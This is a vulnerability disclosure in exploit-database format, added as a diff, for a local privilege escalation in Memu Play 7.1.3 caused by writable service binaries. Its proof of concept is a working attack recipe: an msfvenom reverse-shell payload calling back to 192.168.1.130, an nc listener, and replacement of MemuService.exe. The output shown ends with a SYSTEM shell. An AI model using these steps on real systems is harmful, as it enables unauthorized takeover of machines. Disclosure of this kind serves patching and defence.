@@ -1,0 +1,70 @@
+# Exploit Title: Memu Play 7.1.3 - Insecure Folder Permissions
+# Discovery by: chuyreds
+# Discovery Date: 2020-03-08
+# Vendor Homepage: https://www.memuplay.com/
+# Software Link : https://www.memuplay.com/download-en.php?file_name=Memu-Setup&from=official_release
+# Tested Version: 7.1.3
+# Vulnerability Type: Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Description:
+#  Memu Play 7.1.3 suffers from Privilege Escalation due to insecure file permissions
+
+# Prerequisites
+# Local, Low privilege access with restart capabilities
+
+# Details
+# By default the Authenticated Users group has the modify permission to ESM folders/files as shown below.  
+# A low privilege account is able to rename the MemuService.exe file located in this same path and replace 
+# with a malicious file that would connect back to an attacking computer giving system level privileges 
+# (nt authority\system) due to the service running as Local System.  
+# While a low privilege user is unable to restart the service through the application, a restart of the 
+# computer triggers the execution of the malicious file.
+
+C:\>icacls "C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe"
+C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe Everyone:(I)(F)
+                                                      BUILTIN\Administradores:(I)(F)
+                                                      BUILTIN\Usuarios:(I)(F)
+                                                      NT AUTHORITY\SYSTEM:(I)(F)
+                                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                                      APPLICATION PACKAGE AUTHORITY\TODOS LOS PAQUETES DE APLICACIÓN RESTRINGIDOS:(I)(RX)
+
+Se procesaron correctamente 1 archivos; error al procesar 0 archivos
+
+
+C:\>sc qc MEmuSVC
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: MEmuSVC
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: "C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe"
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : MEmuSVC
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+# Proof of Concept
+
+1. Generate malicious .exe on attacking machine
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.130 LPORT=443 -f exe > /var/www/html/MemuService.exe
+
+2. Setup listener and ensure apache is running on attacking machine
+    nc -lvp 443
+    service apache2 start
+
+3. Download malicious .exe on victim machine
+    Open browser to http://192.168.1.130/MemuService.exe and download
+
+4. Overwrite file and copy malicious .exe.
+    Renename C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe > MemuService.bak
+    Copy/Move downloaded 'MemuService.exe' file to C:\Program Files (x86)\Microvirt\MEmu\
+
+5. Restart victim machine
+
+6. Reverse Shell on attacking machine opens
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
